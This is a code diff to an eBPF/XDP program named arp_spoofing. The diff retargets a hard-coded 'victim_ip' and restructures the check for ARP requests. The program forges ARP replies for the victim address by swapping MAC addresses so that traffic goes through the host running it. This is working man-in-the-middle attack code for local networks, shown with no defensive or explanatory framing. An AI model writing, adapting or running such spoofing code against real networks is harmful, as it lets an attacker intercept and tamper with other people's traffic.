@@ -6,7 +6,7 @@
 
 char LICENSE[] SEC("license") = "Dual MIT/GPL";
 
-__u8 victim_ip[4] = {172,16,1,1};
+__u8 victim_ip[4] = {172,16,1,91};
 struct ether_arp {
 	struct arphdr ea_hdr;
 	__u8 arp_sha[6];
@@ -31,13 +31,17 @@ int arp_spoofing(struct xdp_md *ctx) {
 	
 	if((void*)(eth_arp + 1) > data_end)
 		return XDP_PASS;
+	
+	if(eth_arp->ea_hdr.ar_op != bpf_htons(ARPOP_REQUEST))
+		return XDP_PASS;
 
-	if(eth_arp->ea_hdr.ar_op == bpf_htons(ARPOP_REQUEST) && (!__builtin_memcmp(eth_arp->arp_tpa, victim_ip, 4) || !__builtin_memcmp(eth_arp->arp_spa, victim_ip, 4))) {
+	if(!__builtin_memcmp(eth_arp->arp_tpa, victim_ip, 4) || !__builtin_memcmp(eth_arp->arp_spa, victim_ip, 4)) {
 		struct bpf_fib_lookup fib_para = {0};
 		__builtin_memcpy(eth->h_dest, eth->h_source, 6);
 		__builtin_memcpy(eth_arp->arp_tha, eth->h_source, 6);
 		fib_para.family = AF_INET;
 		fib_para.ifindex = ctx->ingress_ifindex;
+
 		if (bpf_fib_lookup(ctx, &fib_para, sizeof(fib_para), BPF_FIB_LOOKUP_DIRECT | BPF_FIB_LOOKUP_SRC) == BPF_FIB_LKUP_RET_SUCCESS) {
 			__builtin_memcpy(eth->h_source, fib_para.smac, 6);
 			__builtin_memcpy(eth_arp->arp_sha, fib_para.smac, 6); 
